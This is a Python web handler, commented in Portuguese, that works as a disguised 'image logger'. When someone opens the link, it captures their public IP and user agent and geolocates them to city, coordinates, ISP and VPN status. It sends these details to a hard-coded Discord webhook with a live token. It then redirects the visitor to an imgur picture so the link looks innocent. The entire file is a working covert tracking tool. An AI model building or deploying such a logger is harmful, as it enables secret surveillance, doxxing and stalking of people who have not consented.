from http.server import BaseHTTPRequestHandler
import requests

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Pega SÓ o primeiro IP do header (o real do cliente)
            raw_ip = self.headers.get('x-forwarded-for', self.client_address[0])
            ip = raw_ip.split(',')[0].strip()
            
            ua = self.headers.get('user-agent', 'Unknown')
            
            # Info do IP público
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,as,country,regionName,city,lat,lon,timezone,proxy", timeout=10)
            info = r.json()
            
            webhook_url = "https://discord.com/api/webhooks/1529826199344250971/FhwVCzzEGAHh5a7RiLQC6-vseaAWJDQMiLPwml07pFwCoCKX8njGhfU9HDWc_hh6e57g"
            
            embed = {
                "username": "Image Logger",
                "embeds": [{
                    "title": "🎯 IP Capturado!",
                    "color": 0xFF0000,
                    "fields": [
                        {"name": "🌐 IP Público", "value": f"`{ip}`", "inline": True},
                        {"name": "🏢 ISP", "value": f"`{info.get('isp', '?')}`", "inline": True},
                        {"name": "📍 Localização", "value": f"`{info.get('city', '?')}, {info.get('regionName', '?')}, {info.get('country', '?')}`", "inline": False},
                        {"name": "📌 Coordenadas", "value": f"`{info.get('lat', '?')}, {info.get('lon', '?')}`", "inline": True},
                        {"name": "🕐 Fuso", "value": f"`{info.get('timezone', '?')}`", "inline": True},
                        {"name": "🛡️ Proxy/VPN", "value": f"`{info.get('proxy', '?')}`", "inline": True},
                        {"name": "💻 User-Agent", "value": f"```{ua[:150]}```", "inline": False}
                    ],
                    "thumbnail": {"url": "https://i.imgur.com/3i3UjfE.jpg"},
                    "footer": {"text": "Apenas IP público é visível externamente"}
                }]
            }
            
            requests.post(webhook_url, json=embed, timeout=10)
            
            # Redireciona pra imagem real
            self.send_response(302)
            self.send_header('Location', 'https://i.imgur.com/3i3UjfE.jpg')
            self.end_headers()
            
        except Exception as e:
            print(f"Erro: {e}")
            self.send_response(302)
            self.send_header('Location', 'https://i.imgur.com/3i3UjfE.jpg')
            self.end_headers()
